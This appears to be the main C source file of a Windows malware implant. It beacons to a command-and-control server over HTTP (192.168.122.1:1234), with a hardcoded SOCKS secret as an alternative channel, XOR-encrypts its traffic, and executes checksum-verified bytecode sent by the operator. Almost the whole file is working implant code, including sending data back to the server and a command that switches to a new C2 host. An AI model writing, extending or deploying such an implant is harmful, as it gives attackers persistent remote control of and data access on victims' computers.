#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "datatypes.h"
#include "utils/crc32.h"
#include "commands.h"
#include "c2.h"
#include "crypter.h"
#define UUID "peasant2"
#define SOCKS_SECRET "VERYSECRET1337"

int main(){
    C2* conn;
    while(1){
        //conn = newC2(SOCKS, UUID, SOCKS_SECRET, "localhost", 6968, 1000);
        conn = newC2(HTTP, UUID, "http://192.168.122.1:1234/document/", 1000);
        addRxEnc(conn, 1, xor);
        addTxEnc(conn, 1, xor);
        while(1){
            unsigned int rax = 0;
            VMstate state = recvC2(*conn);
            if(state.isize == -1){
                cleanC2(*conn);
                free(conn);
                break;
            }else if(state.isize == -2){
                continue;
            }
            int size = state.isize;
            unsigned char* instructs = state.instructs;
            unsigned char* ip = instructs;
            
            int dsize = state.dsize;
            unsigned char* data = state.data;
            unsigned char* sp = data;
            
            if((crc32(0, instructs+4, size-4) != popint(&ip)) || (crc32(0, data+4, dsize-4) != popint(&sp))){ //exclude actual checksum from compute
                printf("error! checksum fail!\n");
                goto end;
            }

            while((ip-size) < instructs){ //is there still stuff on stack
                unsigned int mnem = popint(&ip);
                
                if(mnem == EXIT){
                    free(data-BACKLOG);
                    free(instructs);
                    goto fin;
                }else if(mnem == POPINT){
                    char data[50] = {0};
                    sprintf(data, "[INT]: %d", rax);
                    rax = 0;
                    sendC2(*conn, data, strlen(data));
                }else if(mnem == POPSTR){
                    String str = popstr(&sp);
                    sendC2(*conn, str.data, str.len);
                    fs(str);
                }else if(mnem == PRINT){
                    String str = popstr(&sp);
                    //pstr(str);
                    rax = str.len;
                    sendC2(*conn, str.data, str.len);
                    fs(str);
                }else if(mnem == SWAP_C2){
                    void** tmprx = conn->cryptRx;
                    void** tmptx = conn->cryptTx;
                    unsigned int code = popint(&sp);
                    
                    if(code == SOCKS){
                        String ip = popstr(&sp);
                        unsigned int port = popint(&sp);
                        unsigned int poll = popint(&sp);
                        C2* conn2 = newC2(SOCKS, UUID, SOCKS_SECRET, ip.data, port, poll);
                        if(conn2 != NULL){
                            cleanC2(*conn);
                            memcpy(conn, conn2, sizeof(C2));
                            free(conn2);
                        }
                        fs(ip);
                    }else if(code == HTTP){
                        String ip = popstr(&sp);
                        unsigned int poll = popint(&sp);
                        C2* conn2 = newC2(HTTP, UUID, ip.data, poll);
                        if(conn2 != NULL){
                            cleanC2(*conn);
                            memcpy(conn, conn2, sizeof(C2));
                            free(conn2);
                        }
                        fs(ip);
                    }
                    conn->cryptRx = tmprx;
                    conn->cryptTx = tmptx;
                }else if(parse(mnem, &sp, &rax, conn)){
                    printf("error! invalid opcode! 0x%x\n", mnem);
                    goto end;
                }
            }
        end:
            free(data-BACKLOG);
            free(instructs);
        }
    }
fin:
    cleanC2(*conn);
    free(conn);
}